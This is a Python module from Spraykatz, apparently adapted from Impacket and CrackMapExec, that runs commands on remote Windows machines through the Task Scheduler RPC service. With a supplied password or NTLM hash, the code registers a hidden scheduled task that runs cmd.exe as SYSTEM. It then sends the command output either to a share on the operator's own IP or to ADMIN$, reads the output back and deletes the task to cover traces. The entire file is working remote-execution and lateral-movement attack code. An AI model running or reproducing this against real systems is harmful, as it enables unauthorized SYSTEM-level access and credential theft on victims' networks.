# coding: utf-8
#
# This file comes from Impacket & CrackMapExec project
# Slightly modified for Spraykatz.


# Imports
import os, sys, logging, time
from core.Utils import *
from core.Colors import *
from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL


class TSCH_EXEC:
    def __init__(self, target, share_name, username, password, domain, hashes=None, port=445):
        self.__target = target
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__share_name = share_name
        self.__lmhash = ''
        self.__nthash = ''
        self.__outputBuffer = ''
        self.__retOutput = False
        self.__port = port

        if hashes is not None:
            if hashes.find(':') != -1:
                self.__lmhash, self.__nthash = hashes.split(':')
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ''

        stringbinding = r'ncacn_np:%s[\pipe\atsvc]' % self.__target
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)

        if hasattr(self.__rpctransport, 'set_credentials'):
            self.__rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def execute(self, command, alea, output=False):
        self.__retOutput = output
        self.execute_handler(command, alea)
        return self.__outputBuffer

    def output_callback(self, data):
        self.__outputBuffer = data

    def execute_handler(self, data, alea):
        if self.__retOutput:
            try:
                self.doStuff(data, alea, fileless=True)
            except:
                self.doStuff(data, alea)
        else:
            self.doStuff(data, alea)

    def gen_xml(self, command, alea, tmpFileName, fileless=False):

        xml = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>cmd.exe</Command>
"""
        if self.__retOutput:
            if fileless:
                local_ip = self.__rpctransport.get_socket().getsockname()[0]
                command = command.replace('&', '&amp;')
                command = command.replace('ABCD', '%')
                command = command.replace('EFGH', '%')
                argument_xml = "      <Arguments>/C {} &gt; \\\\{}\\{}\\tmp\\{} &amp; net use \\\\{}\\{} /del</Arguments>".format(command, local_ip, alea, tmpFileName, local_ip, alea)
            else:
                argument_xml = "      <Arguments>/C {} &gt; %windir%\\Temp\\{} &amp; net use \\\\{}\\{} /del</Arguments>".format(command, tmpFileName, local_ip, alea)

        elif self.__retOutput is False:
            argument_xml = "      <Arguments>/C {}</Arguments>".format(command)

        logging.debug("%sGenerated argument XML: %s" % (debugBlue, argument_xml))
        xml += argument_xml

        xml += """
    </Exec>
  </Actions>
</Task>
"""
        return xml

    def doStuff(self, command, alea, fileless=False):

        dce = self.__rpctransport.get_dce_rpc()

        dce.set_credentials(*self.__rpctransport.get_credentials())
        dce.connect()
        dce.bind(tsch.MSRPC_UUID_TSCHS)
        tmpName = gen_random_string(8)
        tmpFileName = tmpName + '.tmp'

        xml = self.gen_xml(command, alea, tmpFileName, fileless)

        taskCreated = False
        logging.debug("%sCreating task \\%s" % (debugBlue, tmpName))
        tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
        taskCreated = True

        logging.debug("%sRunning task \\%s" % (debugBlue, tmpName))
        tsch.hSchRpcRun(dce, '\\%s' % tmpName)

        done = False
        while not done:
            logging.debug("%sCalling SchRpcGetLastRunInfo for \\%s" % (debugBlue, tmpName))
            resp = tsch.hSchRpcGetLastRunInfo(dce, '\\%s' % tmpName)
            if resp['pLastRuntime']['wYear'] != 0:
                done = True
            else:
                time.sleep(2)

        logging.debug("%sDeleting task \\%s" % (debugBlue, tmpName))
        tsch.hSchRpcDelete(dce, '\\%s' % tmpName)
        taskCreated = False

        if taskCreated is True:
            tsch.hSchRpcDelete(dce, '\\%s' % tmpName)

        if self.__retOutput:
            if fileless:
                while True:
                    try:
                        with open(os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'misc', 'tmp', tmpFileName), 'r') as output:
                            out = output.read()
                            if "TOTHEMOON" in out:
                                self.output_callback(output.read())
                                break
                    except IOError:
                        time.sleep(1)
            else:
                peer = ':'.join(map(str, self.__rpctransport.get_socket().getpeername()))
                smbConnection = self.__rpctransport.get_smb_connection()
                while True:
                    try:
                        smbConnection.getFile('ADMIN$', 'Temp\\%s' % tmpFileName, self.output_callback)
                        break
                    except Exception as e:
                        if str(e).find('SHARING') > 0:
                            time.sleep(3)
                        elif str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
                            time.sleep(3)
                        else:
                            raise
                smbConnection.deleteFile('ADMIN$', 'Temp\\%s' % tmpFileName)

        dce.disconnect()
